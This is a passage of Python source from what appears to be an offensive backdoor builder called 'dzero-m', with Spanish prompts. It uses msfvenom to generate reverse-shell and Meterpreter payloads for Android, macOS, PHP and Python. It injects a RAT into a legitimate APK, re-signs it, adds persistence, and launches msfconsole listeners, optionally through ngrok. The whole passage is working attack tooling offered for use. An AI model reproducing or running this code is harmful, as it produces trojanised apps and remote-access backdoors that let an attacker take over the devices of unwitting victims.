								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_tcp; exploit\'"')
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()		
						else:
							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
							time.sleep(3)
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()		

					elif m == '02':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						Tk().withdraw()
						APK = filedialog.askopenfilename(title = "dzero-m - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_tcp LPORT={0} LHOST={1} R > output/payload.apk'.format(LPORT, LHOST))
						location = os.getcwd()
						print("{0}[*] Decompiling original APK...{1}".format(GREEN, DEFAULT))						
						time.sleep(4)
						os.system('cp {0} {1}/output/original.apk && apktool d -f -o output/original output/original.apk'.format(APK, location))
						print("\n{0}[*] Decompiling payload APK...{1}".format(GREEN, DEFAULT))						
						time.sleep(4)
						os.system('apktool d -f -o output/payload output/payload.apk')
						print("\n{0}[*] Configuring RAT Payload...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)				
						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; rat'])
						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
						time.sleep(4)
						os.system('apktool b output/original -o output/dzero-m.apk')
						if os.path.isfile('output/dzero-m.apk'):
							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/dzero-m.apk android')	
							time.sleep(4)
							os.system('zipalign 4 output/dzero-m.apk output/{0}.apk'.format(mainout))
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break							
							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/dzero-m.apk')
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_tcp; exploit\'"')
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
							time.sleep(3)
							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/dzero-m.apk')							
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	

					else:
						print("{}\n[X] OPCION INVALIDA\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('clear')
						main()	

				else:
					print("\n{}[X] OPCION INVALIDA\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('clear')
					main()	

			else:
				print("\n{}[X] OPCION INVALIDA\n".format(RED))
				time.sleep(3)
				pause("{}Presione cualquier tecla para continuar...".format(GREEN))
				os.system('clear')
				main()	
												
		elif sys == '04':
			print ('{0}\n [*] {1}Select Payload:\n'.format(DEFAULT, GREEN))
			print ('{0}[01]{1} osx/x64/meterpreter_reverse_http'.format(WHITE, YELLOW))
			print ('{0}[02]{1} osx/x64/meterpreter_reverse_https'.format(WHITE, YELLOW))
			print ('{0}[03]{1} osx/x64/meterpreter_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[04]{1} osx/x64/meterpreter/reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[05]{1} osx/x64/shell_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[06]{1} osx/x86/shell_reverse_tcp'.format(WHITE, YELLOW))

			pay = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
			pay = pay.zfill(2)

			if pay == '01':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p osx/x64/meterpreter_reverse_http LHOST={0} LPORT={1} -f macho > output/{2}.macho'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.macho'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.macho".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x64/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD osx/x64/meterpreter_reverse_http; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()						

			elif pay == '02':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p osx/x64/meterpreter_reverse_https LHOST={0} LPORT={1} -f macho > output/{2}.macho'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.macho'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.macho".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x64/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD osx/x64/meterpreter_reverse_https; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()			

			elif pay == '03':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f macho > output/{2}.macho'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.macho'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.macho".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x64/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD osx/x64/meterpreter_reverse_tcp; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()											

			elif pay == '04':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f macho > output/{2}.macho'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.macho'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.macho".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x64/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD osx/x64/meterpreter/reverse_tcp; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '05':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p osx/x64/shell_reverse_tcp LHOST={0} LPORT={1} -f macho > output/{2}.macho'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.macho'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.macho".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x64/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD osx/x64/shell_reverse_tcp; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '06':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p osx/x86/shell_reverse_tcp LHOST={0} LPORT={1} -f macho > output/{2}.macho'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.macho'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.macho".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD osx/x86/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD osx/x86/shell_reverse_tcp; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	
			else:
				print("\n{}[X] OPCION INVALIDA\n".format(RED))
				time.sleep(3)
				pause("{}Presione cualquier tecla para continuar...".format(GREEN))
				os.system('clear')
				main()	

		elif sys == '05':
			print ('{0}\n [*] {1}Select Payload:\n'.format(DEFAULT, GREEN))
			print ('{0}[01]{1} php/meterpreter_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[02]{1} php/meterpreter/reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[03]{1} php/reverse_php'.format(WHITE, YELLOW))

			pay = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
			pay = tool.zfill(2)

			if pay == '01':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p php/meterpreter_reverse_tcp LHOST={0} LPORT={1} R > output/{2}.php'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.php'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.php".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD php/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD php/meterpreter_reverse_tcp; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()				
				else:
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()		

			if pay == '02':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p php/meterpreter/reverse_tcp LHOST={0} LPORT={1} R > output/{2}.php'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.php'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.php".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD php/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD php/meterpreter/reverse_tcp; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()				
				else:
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()											

			elif pay == '03':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p php/reverse_php LHOST={0} LPORT={1} R > output/{2}.php'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.php'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.php".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD php/reverse_php; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD php/reverse_php; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			else:
				print("\n{}[X] OPCION INVALIDA\n".format(RED))
				time.sleep(3)
				pause("{}Presione cualquier tecla para continuar...".format(GREEN))
				os.system('clear')
				main()	

		elif sys == '06':
			print ('{0}\n [*] {1}Select Payload:\n'.format(DEFAULT, GREEN))
			print ('{0}[01]{1} python/meterpreter_reverse_http'.format(WHITE, YELLOW))
			print ('{0}[02]{1} python/meterpreter_reverse_https'.format(WHITE, YELLOW))
			print ('{0}[03]{1} python/meterpreter_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[04]{1} python/meterpreter/reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[05]{1} python/shell_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[06]{1} python/shell_reverse_tcp_ssl'.format(WHITE, YELLOW))
			print ('{0}[07]{1} python/shell_reverse_udp'.format(WHITE, YELLOW))

			pay = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
			pay = pay.zfill(2)

			if pay == '01':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p python/meterpreter_reverse_http LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.py'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.py".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD python/meterpreter_reverse_http; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()								

			elif pay == '02':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p python/meterpreter_reverse_https LHOST={0} LPORT={1} -f raw > output/{2}.py'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.py'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.py".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()	
					else:
						if not ".tcp.ngrok.io" in LHOST:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD python/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
